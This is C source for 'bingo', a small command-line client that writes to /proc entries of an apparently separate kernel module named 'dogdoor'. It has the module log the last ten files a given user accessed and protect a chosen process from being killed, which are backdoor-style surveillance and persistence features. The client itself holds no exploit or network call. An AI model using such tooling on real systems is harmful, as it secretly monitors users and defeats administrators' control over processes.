#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define CMD_SIZE 128
#define ARG_PARSER ":u:p:h"
#define PATH_DOGDOOR "/proc/dogdoor"
#define PATH_DOGDOOR_PID "/proc/dogdoor_pid"
#define CMD_ECHO "echo %d > "

void help_msg() {
    fprintf(stderr,
        "Usage: bingo [-u user | -p pid]\n"
        "Options:\n"
        "\t-p pid\t: prevent kill pid\n"
        "\t-u user\t: logging to /proc/dogdoor_log lastly ten files accessed by user_name\n"
    );
}

void need_help() {
    fprintf(stderr, "enter './bingo -h' for help message\n");
}

void process_username(char * username) {
    struct passwd * pw;
    char cmd[CMD_SIZE];

    pw = getpwnam(username);
    if (pw != NULL) 
        sprintf(cmd, CMD_ECHO PATH_DOGDOOR, pw->pw_uid);
    else 
        sprintf(cmd, CMD_ECHO PATH_DOGDOOR, -1);
    system(cmd);
}

void process_pid(int pid) {
    char cmd[CMD_SIZE];
    sprintf(cmd, CMD_ECHO PATH_DOGDOOR_PID, pid);
    system(cmd);
}

void argparse(int argc, char * argv[]) {
    int opt;
    while((opt = getopt(argc, argv, ARG_PARSER)) != -1)  
    {  
        switch(opt)  
        {
            case 'u':
                process_username(optarg);
                break;  
            case 'p':
                process_pid(atoi(optarg));
                break;  
            case 'h':
                help_msg();
                break;  
            case ':':  
                if (opt == 'u' || opt == 'p') 
                    help_msg();
                break;  
            case '?':  
                fprintf(stderr, "unknown option: %c\n", optopt); 
                need_help();
                break;  
        }  
    }
}

int main(int argc, char* argv[]) {
    if (argc == 1) {
        help_msg();
        return 1;
    }

    argparse(argc, argv);
    if (argc - optind > 0) {
        fprintf(stderr, "unknown option: %s\n", argv[optind]);
        need_help();
        return 1;
    }
    return 0;
}
